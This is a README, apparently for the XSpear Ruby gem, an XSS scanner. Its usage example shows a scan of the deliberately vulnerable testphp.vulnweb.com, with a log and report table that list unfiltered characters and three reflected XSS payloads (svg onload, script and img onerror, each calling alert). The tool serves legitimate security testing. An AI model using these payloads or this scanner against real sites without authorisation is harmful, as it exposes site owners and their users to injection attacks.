# XSpear

Welcome to your new gem! In this directory, you'll find the files you need to be able to package up your Ruby library into a gem. Put your Ruby code in the file `lib/XSpear`. To experiment with that code, run `bin/console` for an interactive prompt.

TODO: Delete this and the text above, and describe your gem

## Installation

Add this line to your application's Gemfile:

```ruby
gem 'XSpear'
```

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install XSpear

## Usage

```
$ ruby -Ilib exe/XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy"
[*] creating a test query.
[*] test query generation is complete. [50 query]
[*] starting test and analysis. [10 threads]
[-] [00:37:28] not reflected XsPeaR>
[-] [00:37:28] not reflected <XsPeaR
[I] [00:37:28] reflected <XsPeaR[param: searchFor][not filtered <]
[-] [00:37:28] not reflected XsPeaR'
[I] [00:37:28] reflected XsPeaR>[param: searchFor][not filtered >]
[I] [00:37:28] reflected rEfe6[param: searchFor][reflected parameter]
[-] [00:37:28] not reflected rEfe6
[-] [00:37:28] not reflected XsPeaR"
[I] [00:37:28] reflected XsPeaR"[param: searchFor][not filtered "]
[I] [00:37:28] reflected XsPeaR'[param: searchFor][not filtered ']
[I] [00:37:29] reflected XsPeaR|[param: searchFor][not filtered |]
[-] [00:37:29] not reflected XsPeaR|
[-] [00:37:29] not reflected XsPeaR)
[-] [00:37:29] not reflected XsPeaR;
[I] [00:37:29] reflected XsPeaR;[param: searchFor][not filtered ;]
[I] [00:37:29] reflected XsPeaR([param: searchFor][not filtered (]
[I] [00:37:29] reflected XsPeaR)[param: searchFor][not filtered )]
[-] [00:37:29] not reflected XsPeaR(
[I] [00:37:29] reflected XsPeaR`[param: searchFor][not filtered `]
[-] [00:37:29] not reflected XsPeaR`
[-] [00:37:30] not reflected XsPeaR:
[I] [00:37:30] reflected XsPeaR[[param: searchFor][not filtered []
[I] [00:37:30] reflected XsPeaR{[param: searchFor][not filtered {]
[I] [00:37:30] reflected XsPeaR}[param: searchFor][not filtered }]
[I] [00:37:30] reflected XsPeaR][param: searchFor][not filtered ]]
[-] [00:37:30] not reflected XsPeaR{
[I] [00:37:30] reflected XsPeaR:[param: searchFor][not filtered :]
[-] [00:37:30] not reflected XsPeaR]
[-] [00:37:30] not reflected XsPeaR}
[-] [00:37:30] not reflected XsPeaR[
[I] [00:37:30] reflected XsPeaR.[param: searchFor][not filtered .]
[-] [00:37:30] not reflected XsPeaR=
[-] [00:37:30] not reflected XsPeaR,
[I] [00:37:30] reflected XsPeaR,[param: searchFor][not filtered ,]
[-] [00:37:30] not reflected XsPeaR-
[I] [00:37:30] reflected XsPeaR-[param: searchFor][not filtered -]
[-] [00:37:30] not reflected XsPeaR+
[I] [00:37:30] reflected XsPeaR=[param: searchFor][not filtered =]
[I] [00:37:30] reflected XsPeaR+[param: searchFor][not filtered +]
[-] [00:37:30] not reflected XsPeaR.
[-] [00:37:31] not reflected <svg/onload=alert(45)>
[H] [00:37:31] reflected <svg/onload=alert(45)>[param: searchFor][reflected XSS Code]
[I] [00:37:31] reflected XsPeaR$[param: searchFor][not filtered $]
[H] [00:37:31] reflected <script>alert(45)</script>[param: searchFor][reflected XSS Code]
[-] [00:37:31] not reflected <script>alert(45)</script>
[H] [00:37:31] reflected <img/src onerror=alert(45)>[param: searchFor][reflected XSS Code]
[-] [00:37:31] not reflected <img/src onerror=alert(45)>
[-] [00:37:31] not reflected XsPeaR$
[*] finish scan. the report is being generated..
+----+------+-------------+------------------------------------------------------------+---------------------+
|                                               XSpear report                                                |
|                              http://testphp.vulnweb.com/search.php?test=query                              |
+----+------+-------------+------------------------------------------------------------+---------------------+
| NO | TYPE | ISSUE       | PAYLOAD                                                    | DESCRIPTION         |
+----+------+-------------+------------------------------------------------------------+---------------------+
| 0  | INFO | FILERD RULE | searchFor=yy%3CXsPeaR                                      | not filtered <      |
| 1  | INFO | FILERD RULE | searchFor=yyXsPeaR%3E                                      | not filtered >      |
| 2  | INFO | REFLECTED   | searchFor=yyrEfe6                                          | reflected parameter |
| 3  | INFO | FILERD RULE | searchFor=yyXsPeaR%22                                      | not filtered "      |
| 4  | INFO | FILERD RULE | searchFor=yyXsPeaR%27                                      | not filtered '      |
| 5  | INFO | FILERD RULE | searchFor=yyXsPeaR%7C                                      | not filtered |      |
| 6  | INFO | FILERD RULE | searchFor=yyXsPeaR%3B                                      | not filtered ;      |
| 7  | INFO | FILERD RULE | searchFor=yyXsPeaR%28                                      | not filtered (      |
| 8  | INFO | FILERD RULE | searchFor=yyXsPeaR%29                                      | not filtered )      |
| 9  | INFO | FILERD RULE | searchFor=yyXsPeaR%60                                      | not filtered `      |
| 10 | INFO | FILERD RULE | searchFor=yyXsPeaR%5B                                      | not filtered [      |
| 11 | INFO | FILERD RULE | searchFor=yyXsPeaR%7B                                      | not filtered {      |
| 12 | INFO | FILERD RULE | searchFor=yyXsPeaR%7D                                      | not filtered }      |
| 13 | INFO | FILERD RULE | searchFor=yyXsPeaR%5D                                      | not filtered ]      |
| 14 | INFO | FILERD RULE | searchFor=yyXsPeaR%3A                                      | not filtered :      |
| 15 | INFO | FILERD RULE | searchFor=yyXsPeaR.                                        | not filtered .      |
| 16 | INFO | FILERD RULE | searchFor=yyXsPeaR%2C                                      | not filtered ,      |
| 17 | INFO | FILERD RULE | searchFor=yyXsPeaR-                                        | not filtered -      |
| 18 | INFO | FILERD RULE | searchFor=yyXsPeaR%3D                                      | not filtered =      |
| 19 | INFO | FILERD RULE | searchFor=yyXsPeaR%2B                                      | not filtered +      |
| 20 | HIGH | XSS         | searchFor=yy%3Csvg%2Fonload%3Dalert%2845%29%3E             | reflected XSS Code  |
| 21 | INFO | FILERD RULE | searchFor=yyXsPeaR%24                                      | not filtered $      |
| 22 | HIGH | XSS         | searchFor=yy%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E | reflected XSS Code  |
| 23 | HIGH | XSS         | searchFor=yy%3Cimg%2Fsrc+onerror%3Dalert%2845%29%3E        | reflected XSS Code  |
+----+------+-------------+------------------------------------------------------------+---------------------+

```

## Development

After checking out the repo, run `bin/setup` to install dependencies. Then, run `rake spec` to run the tests. You can also run `bin/console` for an interactive prompt that will allow you to experiment.

To install this gem onto your local machine, run `bundle exec rake install`. To release a new version, update the version number in `version.rb`, and then run `bundle exec rake release`, which will create a git tag for the version, push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/[USERNAME]/XSpear. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## License

The gem is available as open source under the terms of the [MIT License](https://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the XSpear project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://github.com/[USERNAME]/XSpear/blob/master/CODE_OF_CONDUCT.md).
# XSpear
